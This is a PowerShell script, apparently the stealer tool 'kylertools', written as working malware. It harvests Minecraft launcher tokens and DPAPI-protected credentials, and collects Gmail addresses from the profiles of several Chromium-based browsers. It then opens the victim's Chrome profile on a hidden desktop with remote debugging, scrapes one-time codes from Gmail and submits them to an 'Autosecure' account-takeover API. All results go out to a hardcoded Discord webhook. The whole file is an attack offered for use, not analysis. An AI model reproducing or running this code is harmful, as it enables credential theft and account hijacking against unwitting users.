# language: PowerShell 5.1+, target: Windows 11
# kylertools — MC token harvest -> chrome signed-in gmails -> hidden-desktop chrome ->
#             OTP scrape -> Autosecure web API submit. Webhook: MC tokens, gmails, OTP, API trace.

$ErrorActionPreference = "SilentlyContinue"

# ======================= CONFIG =======================
$webhook = $env:KYLER_WEBHOOK
if(-not $webhook){ $webhook = "https://discord.com/api/webhooks/1559825744744677427/D8vviBB2fw5fq702Fw5-A_nCCVKabUvDFh-ZmMRF_osPo73GId41I8gNHvgNTQHFvi5Q" }
$h   = @{ "Content-Type" = "application/json" }
$nl  = [char]10
$bt3 = [char]96 + [char]96 + [char]96
Add-Type -AssemblyName System.Security -EA 0

# --- Autosecure web API contract (FILL THESE) ---
$autosecureBase   = "https://<your-autosecure-host>"
$autosecureHdr    = @{ "Authorization" = "Bearer <token>" }
$startPath        = "/start"
$submitPath       = "/submit"
$startBodyKey     = "email"
$submitSessionKey = "session"
$submitOtpKey     = "otp"
$respSessionKey   = "session"

$cdpPort        = 9222
$pollIntervalS  = 4
$otpTimeoutS    = 240
$deskName       = "kylertools_hidden"
# =====================================================

# =================== TEST OVERRIDE ===================
# uncomment to force a single test gmail (skips chrome discovery)
# $gmailList = @("youremail@gmail.com")
# =====================================================

# ---------- stage 1: MC token harvest ----------
$found = @(); $seen = @()
$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"

function Add-Token {
    param($tok, $user, $src, $type)
    if(-not $tok){ return }
    if($tok.Length -lt 80){ return }
    if(-not $tok.StartsWith("eyJ")){ return }
    $key = "$type|$tok"
    if($seen.ContainsKey($key)){ return }
    $seen[$key] = $true
    $script:found += [PSCustomObject]@{ User = $user; Type = $type; Token = $tok; File = $src }
}

function Scan-Text {
    param($text, $src, $user)
    if(-not $text){ return }
    foreach($m in [regex]::Matches($text, $jwtRegex)){
        $val = [string]$m.Value
        if(-not $val){ continue }
        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
        Add-Token $val $user $src "accessToken"
    }
}

function Scan-File {
    param($path, $user)
    try{
        if((Get-Item $path -EA 0).Length -gt 5mb){ return }
        $raw = Get-Content $path -Raw -EA 0
        if(-not $raw){ return }
        try{
            $j = $raw | ConvertFrom-Json
            if($j.microsoft_account -and $j.microsoft_account.email){
                $script:found += [PSCustomObject]@{ User = $j.microsoft_account.email; Type = "msa-email"; Token = ""; File = $path }
            }
            $stack = New-Object System.Collections.Stack
            $stack.Push($j)
            while($stack.Count -gt 0){
                $node = $stack.Pop()
                if($null -eq $node){ continue }
                if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){ foreach($it in $node){ $stack.Push($it) }; continue }
                if($node -isnot [PSCustomObject]){ continue }
                $uname = $user
                foreach($k in @("username","name","displayName","profileName")){ if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break } }
                if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
                if($node.microsoft_account -and $node.microsoft_account.email){ $uname = $node.microsoft_account.email }
                foreach($k in @("accessToken","token","access_token")){
                    if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" }
                }
                foreach($prop in $node.PSObject.Properties){
                    if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){ $stack.Push($prop.Value) }
                }
            }
        }catch{}
        Scan-Text $raw $path $user
    }catch{}
}

function Scan-Db {
    param($path, $user)
    if(-not (Test-Path $path)){ return }
    try{
        $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite')
        $ms = New-Object IO.MemoryStream
        $fs.CopyTo($ms); $fs.Close()
        Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
    }catch{}
}

$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.minecraft\VaultKey\accounts.json",
    "$env:APPDATA\.minecraft\VaultKey\profiles.json",
    "$env:APPDATA\.minecraft\VaultKey\msa.json",
    "$env:APPDATA\.minecraft\VaultKey\auth.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json",
    "$env:APPDATA\.minecraft\LabyMod\accounts.json",
    "$env:APPDATA\.gdllauncher-carbon\user-data\user-profiles.json",
    "$env:APPDATA\.ATLauncher\accounts.json",
    "$env:APPDATA\.minecraft\tl_accounts.json",
    "$env:APPDATA\HMCL\accounts.json",
    "$env:APPDATA\.hmcl\accounts.json"
)
foreach($p in $paths){ if(Test-Path $p){ Scan-File $p "unknown" } }

$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $dec = [Security.Cryptography.ProtectedData]::Unprotect([IO.File]::ReadAllBytes($bin), $null, "CurrentUser")
        Scan-Text ([Text.Encoding]::UTF8.GetString($dec)) $bin "unknown"
    }catch{}
}

$roots = @("$env:APPDATA\.minecraft","$env:APPDATA\.lunarclient","$env:APPDATA\ModrinthApp","$env:APPDATA\PrismLauncher","$env:APPDATA\MultiMC","$env:APPDATA\xmcl","$env:APPDATA\.technic","$env:APPDATA\.feather","$env:APPDATA\.gdlauncher-carbon","$env:APPDATA\.ATLauncher","$env:APPDATA\PollyMC","$env:APPDATA\HMCL")
$includeNames = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
foreach($r in $roots){
    if(-not (Test-Path $r)){ continue }
    try{
        foreach($f in (Get-ChildItem $r -Recurse -File -Include $includeNames -EA 0)){
            if($f.FullName -match "webcache|node_modules|\.git\\"){ continue }
            if($f.Length -gt 1mb){ continue }
            Scan-File $f.FullName "unknown"
        }
    }catch{}
}

$dbs = @("$env:APPDATA\ModrinthApp\app.db","$env:APPDATA\ModrinthApp\app.db-wal","$env:APPDATA\ModrinthApp\app.db-shm","$env:APPDATA\gdlauncher\gdl_conf.db","$env:APPDATA\gdlauncher\gdl_conf.db-wal","$env:APPDATA\gdlauncher-carbon\gdl_conf.db","$env:APPDATA\.gdlauncher\gdl_conf.db","$env:APPDATA\Gml-Launcher\launcher.db")
foreach($db in $dbs){ Scan-Db $db "db-scan" }

$webcaches = @("$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb","$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb","$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb")
foreach($lc in $webcaches){
    if(-not (Test-Path $lc)){ continue }
    try{
        foreach($f in (Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50)){
            try{ Scan-Text ([Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))) $f.FullName "unknown" }catch{}
        }
    }catch{}
}

# ---------- stage 2: gmail addresses (from chrome) ----------
function Get-JwtClaim {
    param([string]$jwt, [string[]]$names)
    try{
        $parts = $jwt.Split('.')
        if($parts.Count -lt 2){ return $null }
        $p = $parts[1].Replace('-','+').Replace('_','/')
        while($p.Length % 4){ $p += "=" }
        $obj = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))) | ConvertFrom-Json
        foreach($n in $names){
            if($obj.PSObject.Properties[$n] -and $obj.$n){ return [string]$obj.$n }
        }
    } catch {}
    return $null
}

function Read-PrefsSafe {
    param([string]$path)
    for($i=0; $i -lt 3; $i++){
        try{
            $raw = Get-Content $path -Raw -EA 0
            if($raw){ return ($raw | ConvertFrom-Json) }
        } catch {}
        Start-Sleep -Milliseconds 200
    }
    return $null
}

function Get-ChromeGoogleAccounts {
    $out = @{}
    $chromeRoots = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Google\Chrome Beta\User Data",
        "$env:LOCALAPPDATA\Google\Chrome Dev\User Data",
        "$env:LOCALAPPDATA\Google\Chrome SxS\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\Chromium\User Data"
    )
    foreach($root in $chromeRoots){
        if(-not (Test-Path $root)){ continue }
        $profDirs = @(Get-ChildItem $root -Directory -EA 0 | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })
        foreach($p in $profDirs){
            $prefs = Join-Path $p.FullName "Preferences"
            if(-not (Test-Path $prefs)){ continue }
            $j = Read-PrefsSafe -path $prefs
            if(-not $j){ continue }
            if($j.account_info){
                foreach($a in $j.account_info){
                    if($a.email -and $a.email -match "@(gmail|googlemail)\.com$"){
                        $out[$a.email] = $p.FullName
                    }
                }
            }
        }
    }
    return $out
}

if(-not $gmailList){
    $chromeGmails = Get-ChromeGoogleAccounts
    $gmails = @{}
    foreach($e in $chromeGmails.Keys){ $gmails[$e] = $true }

    if($gmails.Count -eq 0){
        $gmailRx = [regex]'[A-Za-z0-9._%+\-]+@(gmail\.com|googlemail\.com)'
        foreach($t in $found){
            if($t.Token){
                $claim = Get-JwtClaim -jwt $t.Token -names @("upn","email","preferred_username","unique_name","mail","emailAddress")
                if($claim){ foreach($m in $gmailRx.Matches($claim)){ $gmails[$m.Value] = $true } }
            }
            if($t.User){ foreach($m in $gmailRx.Matches([string]$t.User)){ $gmails[$m.Value] = $true } }
        }
    }

    $gmailList = @($gmails.Keys)
}

# ---------- Autosecure web API (instrumented) ----------
$asTrace = @()

function Invoke-WithRetry {
    param([scriptblock]$Action, [int]$Tries = 3)
    for($i=0; $i -lt $Tries; $i++){
        try{ $r = & $Action; if($null -ne $r){ return $r } } catch {}
        Start-Sleep 2
    }
    return $null
}

function AS-Start {
    param([string]$email)
    $url = $autosecureBase.TrimEnd("/") + $startPath
    $lastStatus = "NO_CALL"
    $val = Invoke-WithRetry {
        try{
            $body = @{ $startBodyKey = $email } | ConvertTo-Json -Compress
            $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" `
                    -Body $body -TimeoutSec 20 -UseBasicParsing -EA Stop
            $lastStatus = "HTTP_$($r.StatusCode)"
            ($r.Content | ConvertFrom-Json).$respSessionKey
        } catch {
            $resp = $_.Exception.Response
            if($resp){ try{ $lastStatus = "HTTP_$([int]$resp.StatusCode)"; return $null } catch {} }
            $m = $_.Exception.Message
            if($m -match "Name or service not known|No such host|getaddrinfo"){ $lastStatus = "DNS_FAIL" }
            elseif($m -match "timed out|timeout"){ $lastStatus = "TIMEOUT" }
            elseif($m -match "refused|reset|forcibly"){ $lastStatus = "CONN_REFUSED" }
            else{ $lastStatus = "ERR: $m" }
            return $null
        }
    }
    $script:asTrace += [PSCustomObject]@{ Email = $email; Call = "start"; Status = $lastStatus }
    return @{ ok = ($null -ne $val); value = $val; status = $lastStatus }
}

function AS-Submit {
    param([string]$email, [string]$session, [string]$otp)
    $url = $autosecureBase.TrimEnd("/") + $submitPath
    $lastStatus = "NO_CALL"
    $val = Invoke-WithRetry {
        try{
            $body = @{ $submitSessionKey = $session; $submitOtpKey = $otp } | ConvertTo-Json -Compress
            $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" `
                    -Body $body -TimeoutSec 20 -UseBasicParsing -EA Stop
            $lastStatus = "HTTP_$($r.StatusCode)"
            ($r.StatusCode -lt 400)
        } catch {
            $resp = $_.Exception.Response
            if($resp){
                $code = 0; try{ $code = [int]$resp.StatusCode } catch {}
                $lastStatus = "HTTP_$code"
                if($code -ge 400 -and $code -lt 500){ return "FAILFAST_$code" }
                return $false
            }
            $m = $_.Exception.Message
            if($m -match "timed out|timeout"){ $lastStatus = "TIMEOUT" }
            elseif($m -match "refused|reset|forcibly"){ $lastStatus = "CONN_REFUSED" }
            else{ $lastStatus = "ERR: $m" }
            return $false
        }
    }
    $script:asTrace += [PSCustomObject]@{ Email = $email; Call = "submit"; Status = $lastStatus }
    $okVal = ($val -eq $true)
    return @{ ok = $okVal; status = $lastStatus }
}

# ---------- CDP + hidden desktop ----------
Add-Type -AssemblyName System.Net.WebSockets -EA 0

$deskSrc = @"
using System;
using System.Runtime.InteropServices;
public static class Desk {
    [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateDesktopW(string name, IntPtr dev, IntPtr dm, int flags, uint access, IntPtr sa);
    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool CloseDesktop(IntPtr h);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessW(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit,
        uint flags, IntPtr env, string cwd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
}
"@
Add-Type -TypeDefinition $deskSrc -Language CSharp -EA 0

function Cdp-Session { param([string]$wsUrl)
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ws.ConnectAsync([uri]$wsUrl, [Threading.CancellationToken]::None).Wait()
    return $ws
}
function Cdp-Send { param($ws, [int]$id, [string]$method, $params)
    $payload = @{ id=$id; method=$method; params=$params } | ConvertTo-Json -Compress -Depth 10
    $bytes = [Text.Encoding]::UTF8.GetBytes($payload)
    $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
    $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait()
}
function Cdp-RecvUntilId { param($ws, [int]$id, [int]$timeoutSec = 15)
    $buf = New-Object byte[] 131072
    $ms = New-Object IO.MemoryStream
    $deadline = (Get-Date).AddSeconds($timeoutSec)
    while((Get-Date) -lt $deadline){
        try{
            $res = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] -ArgumentList @(,$buf)), [Threading.CancellationToken]::None).Result
        } catch { return $null }
        if(-not $res){ return $null }
        $ms.Write($buf, 0, $res.Count)
        if($res.EndOfMessage){
            $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray()); $ms.SetLength(0) | Out-Null
            try{ $j = $txt | ConvertFrom-Json; if($j.id -eq $id){ return $j } } catch {}
        }
    }
    return $null
}
function Cdp-WaitLoadEvent { param($ws, [int]$timeoutSec = 20)
    $buf = New-Object byte[] 131072
    $ms = New-Object IO.MemoryStream
    $deadline = (Get-Date).AddSeconds($timeoutSec)
    while((Get-Date) -lt $deadline){
        try{
            $res = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] -ArgumentList @(,$buf)), [Threading.CancellationToken]::None).Result
        } catch { return }
        if(-not $res){ return }
        $ms.Write($buf, 0, $res.Count)
        if($res.EndOfMessage){
            $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray()); $ms.SetLength(0) | Out-Null
            if($txt -match '"method"\s*:\s*"Page\.loadEventFired"'){ return }
        }
    }
}
function Cdp-Reload { param($ws, [int]$idBase)
    Cdp-Send $ws $idBase "Page.enable" @{}; [void](Cdp-RecvUntilId $ws $idBase)
    Cdp-Send $ws ($idBase+1) "Page.reload" @{ ignoreCache = $false }; [void](Cdp-RecvUntilId $ws ($idBase+1))
    Cdp-WaitLoadEvent -ws $ws -timeoutSec 20
    Start-Sleep -Milliseconds 800
}
function Cdp-Eval { param($ws, [string]$expr, [int]$id)
    Cdp-Send $ws $id "Runtime.evaluate" @{ expression=$expr; returnByValue=$true }
    $r = Cdp-RecvUntilId $ws $id
    if($r -and $r.result -and $r.result.result){ return $r.result.result.value }
    return $null
}
function Cdp-NewTab { param([string]$url)
    try{ return (iwr "http://127.0.0.1:$cdpPort/json/new?$([uri]::EscapeDataString($url))" -Method Put -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json } catch { return $null }
}

$otpJs = @'
(() => {
  const t = document.body ? document.body.innerText : "";
  const pat = new RegExp(
    "(?:" +
      "jednorazowy\\s+kod" + "|" +
      "single[\\-\\s]?use\\s+code" + "|" +
      "einmal(?:iger)?\\s+(?:code|Kennwort)" + "|" +
      "code\\s+à\\s+usage\\s+unique" + "|" +
      "código\\s+de\\s+un\\s+solo\\s+uso" + "|" +
      "codice\\s+monouso" + "|" +
      "código\\s+de\\s+uso\\s+único" + "|" +
      "eenmalige\\s+code" + "|" +
      "одноразов\\w*\\s+код" + "|" +
      "jednorázov\\w*\\s+kód" + "|" +
      "tek\\s+kullanımlık\\s+kod" + "|" +
      "ワンタイム\\s*コード" + "|" +
      "일회용\\s*코드" + "|" +
      "一次性(?:密码|代码)" +
    ")[^\\d]{0,40}(\\d{6})", "i"
  );
  let m = t.match(pat);
  if(m) return m[1];
  const s = document.querySelector('h2, .hP');
  if(s){ const sm = s.innerText.match(/(\d{6})/); if(sm) return sm[1]; }
  m = t.match(/\b(\d{6})\b/);
  return m ? m[1] : null;
})()
'@

# ---------- run ----------
$otpResults = @{}
$deskHandle = [IntPtr]::Zero
$hiddenPids = @()

try {
    if($gmailList.Count -gt 0){
        $chrome = @(
            "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
            "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
        ) | Where-Object { Test-Path $_ } | Select-Object -First 1

        if($chrome){
            $liveProfile = "$env:LOCALAPPDATA\Google\Chrome\User Data"

            Get-Process chrome -EA 0 | Stop-Process -Force -EA 0

            $lock = Join-Path $liveProfile "SingletonLock"
            for($i=0; $i -lt 24; $i++){
                if(-not (Test-Path $lock)){ break }
                Start-Sleep -Milliseconds 500
            }
            Start-Sleep 1

            $deskHandle = [Desk]::CreateDesktopW($deskName, [IntPtr]::Zero, [IntPtr]::Zero, 0, 0x01FF, [IntPtr]::Zero)
            if($deskHandle -eq [IntPtr]::Zero){
                Write-Host "[desk] CreateDesktopW failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            } else {
                $chromeCmd = "`"$chrome`" --remote-debugging-port=$cdpPort --user-data-dir=`"$liveProfile`" --no-first-run --no-default-browser-check --new-window about:blank"

                $si = [Desk+STARTUPINFO]::new()
                $si.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
                $si.lpDesktop = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($deskName)
                $pi = [Desk+PROCESS_INFORMATION]::new()

                $ok = [Desk]::CreateProcessW($chrome, $chromeCmd, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
                if(-not $ok){
                    Write-Host "[desk] CreateProcessW failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
                } else {
                    if($pi.dwProcessId -gt 0){
                        [void][Desk]::CloseHandle($pi.hProcess)
                        [void][Desk]::CloseHandle($pi.hThread)
                    }
                }
                if($si.lpDesktop -ne [IntPtr]::Zero){ [Runtime.InteropServices.Marshal]::FreeHGlobal($si.lpDesktop) }

                $cdpReady = $false
                for($i=0; $i -lt 30; $i++){
                    try{ $null = iwr "http://127.0.0.1:$cdpPort/json/version" -UseBasicParsing -TimeoutSec 2 -EA Stop; $cdpReady=$true; break } catch { Start-Sleep 1 }
                }

                if($cdpReady){
                    $hiddenPids = @(Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
                                    Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape($liveProfile) } |
                                    Select-Object -ExpandProperty ProcessId)

                    $tabSeq = 0
                    foreach($e in $gmailList){
                        $sres = AS-Start -email $e
                        if(-not $sres.ok){ $otpResults[$e] = "START_FAIL ($($sres.status))"; continue }
                        $sid = $sres.value

                        $url = "https://mail.google.com/mail/u/?authuser=$([uri]::EscapeDataString($e))"
                        $tab = Cdp-NewTab -url $url
                        if(-not $tab){ $otpResults[$e] = "TAB_FAIL"; continue }
                        try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { $otpResults[$e] = "WS_FAIL"; continue }

                        $deadline = (Get-Date).AddSeconds($otpTimeoutS)
                        $otp = $null
                        $idBase = 100 + ($tabSeq * 10); $tabSeq++
                        $firstPass = $true
                        $reconnects = 0
                        $maxReconnects = 3

                        while((Get-Date) -lt $deadline){
                            if($firstPass){
                                Start-Sleep -Seconds $pollIntervalS
                                $firstPass = $false
                            } else {
                                Cdp-Reload -ws $ws -idBase $idBase
                            }

                            $otp = Cdp-Eval -ws $ws -expr $otpJs -id ($idBase + 5)

                            if(-not $otp){
                                $wsDead = $false
                                try{ $wsDead = ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) } catch { $wsDead = $true }
                                if($wsDead){
                                    if($reconnects -ge $maxReconnects){ break }
                                    $reconnects++
                                    try{ $ws.Dispose() } catch {}
                                    Start-Sleep 1
                                    $tab = Cdp-NewTab -url $url
                                    if(-not $tab){ Start-Sleep 2; continue }
                                    try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { Start-Sleep 2; continue }
                                    $idBase = 100 + ($tabSeq * 10); $tabSeq++
                                }
                            } else { break }
                            Start-Sleep -Seconds $pollIntervalS
                        }

                        try{ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"",[Threading.CancellationToken]::None).Wait() } catch {}
                        $ws.Dispose()

                        if(-not $otp){ $otpResults[$e] = "OTP_TIMEOUT"; continue }
                        $sub = AS-Submit -email $e -session $sid -otp $otp
                        $otpResults[$e] = if($sub.ok){ "OK :: $otp" } else { "SUBMIT_FAIL ($($sub.status)) :: $otp" }
                    }
                } else {
                    foreach($e in $gmailList){ $otpResults[$e] = "CDP_UNBOUND" }
                }
            }
        }
    }
}
finally {
    foreach($pid in $hiddenPids){
        try{ Stop-Process -Id $pid -Force -EA 0 } catch {}
    }
    Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
        Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape("$env:LOCALAPPDATA\Google\Chrome\User Data") } |
        ForEach-Object { try{ Stop-Process -Id $_.ProcessId -Force -EA 0 } catch {} }

    if($deskHandle -ne [IntPtr]::Zero){ [void][Desk]::CloseDesktop($deskHandle) }
}

# ---------- exfil ----------
function Send-Embed {
    param($title, $desc, $color, $footerText)
    $embed = @{ title=$title; description=$bt3+$desc+$bt3; color=$color; timestamp=(Get-Date).ToString("o") }
    if($footerText){ $embed.footer = @{ text=$footerText } }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    for($i=0; $i -lt 3; $i++){
        try{ iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null; return }
        catch{ $w=3; try{ $ra=$_.Exception.Response.Headers['Retry-After']; if($ra){$w=[double]$ra} }catch{}; Start-Sleep -Seconds ($w+1) }
    }
}

$limit = 1700

# --- embed 1: MC tokens (ssid = JWT) ---
if($found.Count -eq 0){ $mcReport = "nothin found bro" } else {
    $lines = @(); $i = 0
    foreach($t in $found){
        $i++
        $lines += (@($bt3+"ansi","[ $i ] "+$t.User,"Type: "+$t.Type,"Token: "+$t.Token,"File: "+$t.File,$bt3) -join $nl)
    }
    $mcReport = $lines -join $nl
}
$chunks = @()
for($i=0; $i -lt $mcReport.Length; $i += $limit){ $chunks += $mcReport.Substring($i, [Math]::Min($limit, $mcReport.Length-$i)) }
$n=0
foreach($c in $chunks){ $n++; Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"; Start-Sleep 2 }

# --- embed 2: gmail addresses ---
if($gmailList.Count -gt 0){
    $gl = @("== GMAILS =="); foreach($e in $gmailList){ $gl += $e }
    $grep = $gl -join $nl; $gchunks = @()
    for($i=0; $i -lt $grep.Length; $i += $limit){ $gchunks += $grep.Substring($i, [Math]::Min($limit,$grep.Length-$i)) }
    $m=0
    foreach($c in $gchunks){ $m++; Send-Embed -title "KylerTools | GMAILS" -desc $c -color 5793266 -footerText "kylertools gmails | part $m/$($gchunks.Count)"; Start-Sleep 2 }
}

# --- embed 3: OTP results (all rows, code shown) ---
if($otpResults.Count -gt 0){
    $ol = @("== AUTOSECURE MS-OTP ==")
    foreach($e in $gmailList){
        $raw = [string]$otpResults[$e]
        if(-not $raw){ $raw = "no_result" }
        $ol += "$e :: $raw"
    }
    $orep = $ol -join $nl
    $ochunks = @()
    for($i=0; $i -lt $orep.Length; $i += $limit){ $ochunks += $orep.Substring($i, [Math]::Min($limit, $orep.Length-$i)) }
    $k=0
    foreach($c in $ochunks){ $k++; Send-Embed -title "KylerTools | MS-OTP" -desc $c -color 5793266 -footerText "kylertools otp | part $k/$($ochunks.Count)"; Start-Sleep 2 }
}

# --- embed 4: API trace ---
if($asTrace.Count -gt 0){
    $tl = @("== AUTOSECURE API TRACE ==")
    foreach($t in $asTrace){ $tl += "$($t.Email) :: $($t.Call) :: $($t.Status)" }
    $trep = $tl -join $nl
    $tchunks = @()
    for($i=0; $i -lt $trep.Length; $i += $limit){ $tchunks += $trep.Substring($i, [Math]::Min($limit, $trep.Length-$i)) }
    $j=0
    foreach($c in $tchunks){ $j++; Send-Embed -title "KylerTools | API TRACE" -desc $c -color 3447003 -footerText "kylertools trace | part $j/$($tchunks.Count)"; Start-Sleep 2 }
}
